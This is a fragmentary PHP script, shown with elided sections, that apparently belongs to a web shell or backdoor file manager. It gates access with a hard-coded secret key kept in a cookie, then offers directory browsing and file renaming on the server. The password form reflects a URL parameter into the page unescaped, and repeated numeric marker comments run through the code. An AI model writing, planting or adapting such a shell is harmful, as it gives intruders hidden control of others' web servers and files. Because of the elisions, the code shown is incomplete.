...
$auth_key = "b919b0454698139b102b3ca8f3d69fd6";
...
$pass = false;
if (isset($_COOKIE['pw_name_23019'])) {
    if(($_COOKIE['pw_name_23019']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_23019'])) {
        if(($_POST['pw_name_23019']) == $auth_key) {
            setcookie("pw_name_23019", $_POST['pw_name_23019']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_23019' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1738802503539024 1738802503317367 1738802503870182 1738802503896346
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1738802503539024 1738802503317367 1738802503870182 1738802503896346
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1738802503539024 1738802503317367 1738802503870182 1738802503896346
            $name = PATH . "/" . $_GET['r'];
